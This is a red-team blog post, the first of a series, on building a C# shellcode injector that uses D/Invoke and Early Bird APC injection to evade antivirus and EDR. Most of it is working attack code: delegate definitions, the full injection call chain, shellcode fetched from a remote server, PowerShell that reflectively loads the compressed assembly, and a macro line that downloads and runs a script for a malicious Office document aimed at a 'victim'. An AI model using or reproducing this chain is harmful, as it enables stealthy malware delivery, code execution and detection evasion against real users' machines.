---
layout: single
date: 2023-01-13
title: "Process Injection with D/Invoke - Part 1"
toc: true
draft: false
type: ["posts","post"]
categories:
  - Evasion
tags:
  - Evasion
  - ProcessInjection
  - D/Invoke
  - Early Bird
---
## Introduction
In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let's improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.

I won't be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.

## P/Invoke
On a high level, [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the `System` and `System.Runtime.InteropServices` namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the `OpenProcess` Win32API:

```csharp
# 'Define' the OpenProcess API from kernel32.dll
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(
		uint processAccess,
		bool bInheritHandle,
		int processID);
# Open a handle to 'explorer.exe' with OpenProcess.
IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("explorer")[0].Id);
```

Okay neat, we can import and call any API we want, so what's the downside?
1. Any API import via P/Invoke is a static reference and will be visible in the assembly's Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we're about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as: `VirtualAlloc`, `VirtualAllocEx`, `MoveMemory`, `WriteProcessMemory`, `CreateRemoteThread` will be caught immediately. It's like going through airport security with bag full of explosives, you want to get caught at this point.
2. API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more "obvious" APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but it won't be covered in this post.

## D/Invoke
[D/Invoke](https://github.com/TheWover/DInvoke) - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies to dynamically invoke unmanaged APIs:
- Load a DLL into memory
- Get a pointer to a function/API in that DLL
- Call desired API using the pointer while passing in parameters
This is the standard usage of D/Invoke and will avoid directly importing the APIs into our .NET Assembly's IAT.

To do this, D/Invoke works with [Delegates](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/). I'm probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, `Delegates` allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the `VirtualAllocEx` Win32API:

Creating Delegate for `VirtualAllocEx`:
```csharp
	public class DELEGATES {
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  }
```

To call this Delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
DELEGATES.VirtualAllocEx virAllocEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
IntPtr allocret = virAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x40); //MEM_COMMIT | MEM_RESERVE
```
1. Get the pointer to `VirtualAllocEx` in `kernel32.dll` via the helper function `GetLibraryAddress`.
2. Use `GetDelegateForFunctionPointer` to convert the function pointer into a delegate and cast it with the same delegate type.
3. Call the API/Instantiate the delegate.

*In this blog post series, I won't be importing the whole D/Invoke project, but only take the neccessary helper functions, structs and enums*

## Project Injection 101
Project Injection is a commonly used technique to inject our shellcode into legitimate target process's virtual memory space. A textbook way to perform project injection is:
1. Find a target process to inject our shellcode into.
2. Allocate a new memory region in the remote target process using `VirtualAllocEx`
3. Write our shellcode into the allocated remote memory region using `WriteProcessMemory`
4. Execute our shellcode as a new thread with `CreateRemoteThread`

Here is a PoC to inject shellcode into `explorer.exe`
```csharp
// Get pid of explorer.exe
Process[] explorerProcess = Process.GetProcessesByName("explorer");

// Open a handle to explorer.exe
IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerProcess[0].Id);

// Allocate remote mem
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
// 0x3000 = MEM_COMMIT | MEM_RESERVE (0x1000 | 0x2000)
// 0x40: PAGE_EXECUTE_READWRITE (RWX)

// shellcode
byte[] buf = new byte[511] {0xfc,0x48,...,0xd5};

IntPtr outSize;
// Write shellcode to allocated buffer
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

// Execute thread
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the `PAGE_EXECUTE_READWRITE (RWX)` with `VirtualAllocEx`, as most memory regions in the process has **RX** protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.
{{< image src="/images/explorer_11888.png" alt="Meterpreter shellcode injected into explorer.exe" position="center" style="border-radius: 8px;" >}}
*Meterpreter shellcode was injected successfully into explorer.exe*

{{< image src="/images/explorer_bad_injection.png" alt="RWX region stood out" position="center" style="border-radius: 8px;" >}}
*RWX region containing the shellcode stood out*

This injection could also be detected by this [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2) script:
{{< image src="/images/injection_caught.png" alt="Injection detected" position="center" style="border-radius: 8px;" >}}
*Injection detected*

Additionally, `CreateRemoteThread` API is heavily scrutinized by AV/EDR as this is commonly seen in injection techniques to create a thread that runs in a remote process's virtual memory space.

## Early Bird Process Injection with D/Invoke
Let's improve our injection method with a technique called Early Bird (circa 2018), a variant of APC Queue Injection.
On a high level:
1. Spawn a new process to inject into and put it in suspended state using `CreateProcess`
2. Allocate memory buffer in the target process with `RW` flag using `VirtualAllocEx`
3. Write shellcode in the target buffer using `WriteProcessMemory`
4. Change the target memory region to `RX` in order for our shellcode to execute using `VirtualProtectEx`
4. Queue a thread, pointing the APC object to the shellcode in the target buffer 
5. Resume thread to start the shellcode execution

Let's implement this injection using D/Invoke.
First of all, as mentioned above, I won't be importing the whole D/Invoke project but only taking necessary functions, structs and enums from [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke).
At the time of writing, the list of functions from D/Invoke source code that I have are:
- `DynamicAPIInvoke`: Invoke an arbitrary function from a DLL dynamically, providing its name, function prototype, and arguments.
- `DynamicFunctionInvoke`: Invoke an arbitrary function from a pointer, called by `DynamicAPIInvoke`.
- `GetLibraryAddress`: Helper for getting the pointer to a function from a DLL loaded by the process.
- `GetLoadedModuleAddress`: Helper for getting the base address of a module loaded by the current process.
- `LoadModuleFromDisk`: Resolve `LdrLoadDll` and uses that function to load a DLL from disk.
- `GetExportAddress`: Resolves the address of a function by manually walking the module export table, given a module base address.
We also need to define `RtlInitUnicodeString` and `LdrLoadDll` from `ntdll.dll`, also referenced on [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Native.cs) (LdrLoadDll is an undocumented ntdll native API)

Structs and Enums to include:
- `NTSTATUS`: [Undocumented Enum](https://dinvoke.net/en/ntdll/NTSTATUS)
- `UNICODE_STRING`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string)
- `PROCESS_INFORMATION`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
- `STARTUPINFO`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
- `ProcessCreationFlags`: [Documented Enum](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)


Once all this Ctrl+C and Ctrl+V is done, we can start creating Delegates for the APIs, following the documentations for these APIs from Microsoft.

Creating delegate for [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
```csharp
public class DELEGATES {

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
		IntPtr lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
		string lpCurrentDirectory, ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);

    //......
}
```
Creating delegate for [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

Creating delegate for [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
```

Creating delegate for [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
```

Creating delegate for [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
```

Creating delegate for [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint ResumeThread(IntPtr hThhread);
```

Creating delegate for `LdrLoadDll` (This is an undocumented native API, go to http://undocumented.ntinternals.net/ and search for LdrLoadDll)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
```

Creating delegate for [RtlInitUnicodeString](https://www.pinvoke.net/default.aspx/ntdll/RtlInitUnicodeString.html)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
```

We can now start invoking the APIs through the delegates in our Main() function.
We can either store our (encrypted)shellcode on within the assembly or download it from a remote server.
To download the shellcode from a remote server, we need the `System.Net.Http` namespace, and create a `HttpClient`:
```csharp 
byte[] shellcode;
using (var recv = new HttpClient()) {
  shellcode = recv.GetByteArrayAsync("https://x.x.x.x/shellcode.bin").GetAwaiter().GetResult();
}
``` 

`startInfo` and `procInfo` store process information such as process handle and thread handle:
```csharp
STRUCTS.STARTUPINFO startInfo = new STRUCTS.STARTUPINFO();
STRUCTS.PROCESS_INFORMATION procInfo = new STRUCTS.PROCESS_INFORMATION();
```

Invoke Create Process through its delegate:
```csharp
IntPtr pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateProcessA");
DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
// Spawn new process in suspended state
bool yayornay = createProc("process_path_here", null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
IntPtr.Zero, null, ref startInfo, out procInfo);
```

Invoke VirtualAllocEx through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x04); //MEM_COMMIT | MEM_RESERVE; 0x04: RW
```

Invoke WriteProcessMemory through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
writeProcMem(procInfo.hProcess, allocret, sheocode, (uint)sheocode.Length, out UIntPtr bytesWritten);
```

Invoke VirtualProtectEx through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
virProtEx(procInfo.hProcess, allocret, sheocode.Length, 0x20, out oldProtect); // 0x20: RX
```

Invoke QueueUserAPC through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
```

Invoke ResumeThread through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "ResumeThread");
DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
resThrd(procInfo.hThread);
```

Build our .NET assembly as a x64 executable.
For the sake of the demo, we can cheat a bit. In order to load our assembly in the target's memory, let's gzip compress and then base64 encode the assembly's byte stream, output it to `compressedEncodedBytes.txt`.
```powershell
$bytes = [System.IO.File]::ReadAllBytes("$(pwd)\injection.exe")
[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$outStream.Close()
[byte[]] $outBytes = $outStream.ToArray()
$b64Zipped = [System.Convert]::ToBase64String($outBytes)
$b64Zipped | Out-File -NoNewLine -Encoding ASCII .\compressedEncodedBytes.txt'
```

Create a PowerShell script to decode this compressed and encoded bytestream.
```powershell
$a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("compressed and encoded bytestream here"))
$b = New-Object System.IO.Compression.GZipStream($a, [System.IO.Compression.CompressionMode]::Decompress)
$c = New-Object System.IO.MemoryStream;
$b.CopyTo($c)
[byte[]]$d = $c.ToArray()
$e = [System.Reflection.Assembly]::Load($d)
$f = [System.Console]::Out
$g = New-Object System.IO.StringWriter
[System.Console]::SetOut($g)

$h = [Reflection.BindingFlags]"Public,NonPublic,Static"
$i = $e.GetType("injection.Program", $h)
$j = $i.GetMethod("Main", $h)
$j.Invoke($null, (, [string[]]$args))

[System.Console]::SetOut($f)
$k = $g.ToString()
$k
```

Get this PowerShell script to be loaded and executed via an Office macro, something like:
```vbnet
Dim str As String
    walk = "powershell iex (iwr http://hostingserver/notmalicious.ps1 -Useb)"
    CreateObject("Wscript.Shell").Run walk, 0
```
When the victim opens the maldoc and enables macro, WINWORD will load our PowerShell script, decode, decompress and reflectively run the .NET Assembly.

{{< image src="/images/earlybird_injection.png" alt="inject into svchost.exe" position="center" style="border-radius: 8px;" >}}
*Process injection into svchost.exe*

{{< image src="/images/not_caught_by_getInjectedThread.png" alt="Get-InjectedThread could no longer detect our injection" position="center" style="border-radius: 8px;" >}}
*Get-InjectedThread could no longer detect our injection*

## Is this good enough?
Well no, modern AV/EDR can still nuke our work immediately, this is mainly to demonstrate a common injection technique implemented with D/Invoke.
In Part 2, we can make our `svchost.exe` malware even more benign by PPID Spoofing, making it appear as it got spawned by `services.exe`, which is normally the case. I'm also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!
